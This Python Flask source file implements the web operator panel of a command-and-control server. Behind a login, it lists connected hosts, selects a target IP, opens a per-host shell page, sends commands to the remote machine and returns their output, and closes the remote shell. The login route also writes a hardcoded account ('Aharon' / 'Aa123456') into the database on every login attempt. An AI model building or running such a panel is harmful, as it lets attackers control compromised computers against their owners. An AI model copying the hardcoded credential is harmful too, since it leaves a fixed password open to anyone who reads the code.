from flask import *
import os
from Socket.Server import Server
from .FlskServerTools.user import User
from .FlskServerTools.Dbactions import LoginDB
from flask_login import *
from secrets import token_urlsafe


class FlskSevrev(object):
    
    def __init__(self,C2Private,C2Port=555):
        self.app = Flask(
            __name__, 
            static_folder=os.path.join(os.getcwd(),'FlascAplication','test','templates','static')
        )
        self.app.config['SECRET_KEY'] = token_urlsafe(40)
        self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
        self.dbaction = LoginDB(os.path.join(os.getcwd(),'FlascAplication','test','SQL','Login.db'))
        self.c2Server.start()
        self._ruleResetor()
        self.login_manager = LoginManager()
        self.login_manager.init_app(self.app)
        self.login_manager.user_loader(self.load_user)

    def load_user(self, user_id):
        if self.dbaction.user_exists(user_id):
            return User(user_id)
        return None

    def loginPage(self):
        return render_template("Login.html")
    
    def logout(self):
        logout_user()
        return redirect(url_for('loginPage'))
    

    def login(self):
        if request.method == 'POST':
            self.dbaction.insert_user('Aharon','Aa123456')
            data = request.get_json()
            username = data['username']
            password = data['password']
            if self.dbaction.authenticate_user(username, password):
                user = User(username)
                login_user(user)
                return jsonify({"message": "Login successful"})
            else:
                return jsonify({"message": "Invalid username or password"}), 401
        return self.loginPage()


    @login_required
    def getshell(self,hostname):
        if self.c2Server.connections.isconnected(hostname):
            return render_template('ChatBox.html',hostname=hostname)
        return make_response("Page not found", 404)
    
    @login_required
    def choseTarget(self):
        data = request.get_json()
        self.c2Server.connections.connctTo = data['ip']
        return {'Status': 'Completed'}


    @login_required
    def listConnections(self):
        return self.c2Server.connections.connections
    

    @login_required
    def homePage(self):
        return render_template('Index.html')
    

    @login_required
    def send_message(self):
        data = request.get_json()
        connObj = self.c2Server.connections.getConnObj(data['ip'])
        msg = self.c2Server.retriveCommand(connObj,data['message'])
        return {'message': msg}
    

    @login_required
    def closeShell(self):
        data = request.get_json()
        connObj = self.c2Server.connections.getConnObj(data['ip'])
        self.c2Server.sendMsg(connObj,b'exit')
        self.c2Server.connections.disconnect(data['ip'])
        return {'Status':"Disconnect"}



    def _ruleResetor(self):
        self.app.add_url_rule('/', 'loginPage', self.loginPage)
        self.app.add_url_rule('/login', 'login', self.login ,methods=['GET', 'POST'])
        self.app.add_url_rule('/logout', 'logout', self.logout)
        self.app.add_url_rule('/home', 'homePage', login_required(self.homePage))
        self.app.add_url_rule('/listConnections', 'listConnections', login_required(self.listConnections))
        self.app.add_url_rule('/getshell/<hostname>', 'getshell', login_required(self.getshell))
        self.app.add_url_rule('/send_message', 'send_message', login_required(self.send_message), methods=['POST'])
        self.app.add_url_rule('/closeShell', 'closeShell', login_required(self.closeShell), methods=['POST'])
        self.app.add_url_rule('/choseTarget', 'choseTarget', login_required(self.choseTarget), methods=['POST'])
